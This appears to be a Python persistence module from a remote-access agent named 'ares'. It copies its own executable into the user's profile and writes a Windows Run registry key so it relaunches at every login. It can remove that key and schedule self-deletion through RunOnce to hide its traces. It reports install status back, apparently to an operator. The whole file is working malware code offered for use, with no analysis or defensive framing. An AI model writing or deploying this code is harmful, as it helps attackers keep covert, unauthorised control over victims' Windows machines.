import os
import sys
import subprocess
import shutil
import requests

import utils


SERVICE_NAME= "ares"

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


def install():
    subprocess.Popen(
        "cmd.exe /c start /b reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "%USERPROFILE%\\" + EXECUTABLE_NAME),
                     shell=True)
    shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))


def clean():
    subprocess.Popen("cmd.exe /c start /b reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
                         shell=True)
    subprocess.Popen(
        "cmd.exe /c start /b reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
                     shell=True)


def is_installed():
    proc = subprocess.Popen(
        "cmd.exe /c start /b reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output = proc.stdout.read() + proc.stderr.read()
    if SERVICE_NAME in output:
        return True
    else:
        return False


def run(action):
    if action == "install":
        if is_installed():
            utils.send_output("Already installed")
            return
        install()
        utils.send_output("Persistence installed")
    elif action == "remove":
        clean()
        utils.send_output("Persistence removed")
    elif action == "status":
        if is_installed():
            utils.send_output("Persistence is ON")
        else:
            utils.send_output("Persistence is OFF")
